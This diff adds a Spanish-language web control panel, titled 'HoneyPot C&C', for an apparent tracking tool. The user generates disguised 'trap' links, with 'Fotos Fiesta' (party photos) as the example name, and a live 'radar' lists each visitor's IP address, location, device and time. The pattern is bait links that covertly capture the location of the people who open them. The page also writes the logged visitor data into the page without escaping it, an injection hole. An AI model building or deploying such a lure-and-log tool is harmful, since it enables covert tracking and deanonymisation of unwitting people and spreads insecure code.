@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>HoneyPot C&C</title>
+    <style>
+        :root { --bg: #000000; --card: #1c1c1e; --text: #ffffff; --green: #30d158; --red: #ff453a; --gray: #8e8e93; }
+        body { background-color: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; padding: 20px; padding-top: 50px; }
+        
+        h1 { font-size: 28px; text-align: center; margin-bottom: 30px; letter-spacing: -0.5px; }
+        .status-dot { height: 10px; width: 10px; background-color: var(--green); border-radius: 50%; display: inline-block; margin-right: 5px; box-shadow: 0 0 10px var(--green); }
+        
+        .card { background-color: var(--card); border-radius: 18px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        .btn { background-color: var(--green); color: black; border: none; padding: 15px; width: 100%; border-radius: 14px; font-size: 17px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: transform 0.1s; }
+        .btn:active { transform: scale(0.98); opacity: 0.9; }
+        
+        input { background-color: #2c2c2e; border: none; color: white; padding: 15px; width: 100%; box-sizing: border-box; border-radius: 12px; font-size: 16px; margin-bottom: 10px; outline: none; }
+        
+        .log-item { border-bottom: 1px solid #333; padding: 10px 0; font-size: 14px; }
+        .log-item:last-child { border-bottom: none; }
+        .log-time { color: var(--gray); font-size: 12px; }
+        .log-ip { color: var(--green); font-family: monospace; font-size: 13px; }
+        .log-loc { font-weight: bold; margin-top: 2px; }
+        
+        #link-result { display: none; margin-top: 15px; word-break: break-all; background: #333; padding: 10px; border-radius: 10px; font-family: monospace; color: var(--green); font-size: 12px; text-align: center; }
+        .device-icon { float: right; font-size: 18px; }
+    </style>
+</head>
+<body>
+
+    <h1><span class="status-dot"></span>HONEYPOT C&C</h1>
+
+    <div class="card">
+        <h3 style="margin-top:0">🕸️ Nueva Trampa</h3>
+        <input type="text" id="nombreTrampa" placeholder="Ej: Fotos Fiesta">
+        <button class="btn" onclick="crearTrampa()">GENERAR LINK</button>
+        <div id="link-result" onclick="copiarLink(this)"></div>
+    </div>
+
+    <div class="card">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+            <h3 style="margin:0">📡 Radar en Vivo</h3>
+            <button onclick="cargarLogs()" style="background:none; border:none; color:var(--green); font-size:20px;">↻</button>
+        </div>
+        <div id="logs-container">
+            <div style="text-align:center; color:gray; padding:20px;">Cargando datos...</div>
+        </div>
+    </div>
+
+    <script>
+        // LÓGICA DE LA APP
+        async function crearTrampa() {
+            let nombre = document.getElementById('nombreTrampa').value;
+            if(!nombre) nombre = "Trampa Móvil";
+            
+            try {
+                let res = await fetch('/api/crear_trampa', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({nombre: nombre})
+                });
+                let data = await res.json();
+                let div = document.getElementById('link-result');
+                div.style.display = 'block';
+                div.innerText = data.link;
+                alert("✅ Link Generado. Toca el link verde para copiarlo.");
+            } catch(e) { alert("Error conectando al servidor"); }
+        }
+
+        function copiarLink(elemento) {
+            navigator.clipboard.writeText(elemento.innerText);
+            alert("Copiado al portapapeles");
+        }
+
+        async function cargarLogs() {
+            try {
+                let res = await fetch('/api/ver_ataques');
+                let data = await res.json();
+                let html = "";
+                
+                if(data.length === 0) html = "<div style='text-align:center; padding:20px; color:gray'>Sin actividad</div>";
+                
+                data.forEach(log => {
+                    let icon = "💻";
+                    if(log.dispositivo.includes("iPhone")) icon = " iPhone";
+                    else if(log.dispositivo.includes("Android")) icon = "🤖 Android";
+                    
+                    html += `
+                    <div class="log-item">
+                        <span class="device-icon">${icon}</span>
+                        <div class="log-loc">🌍 ${log.ubicacion}</div>
+                        <div class="log-ip">${log.ip}</div>
+                        <div class="log-time">${log.hora} • ${log.trampa}</div>
+                    </div>`;
+                });
+                document.getElementById('logs-container').innerHTML = html;
+            } catch(e) { console.log(e); }
+        }
+
+        // Cargar logs al iniciar
+        cargarLogs();
+    </script>
+</body>
+</html>
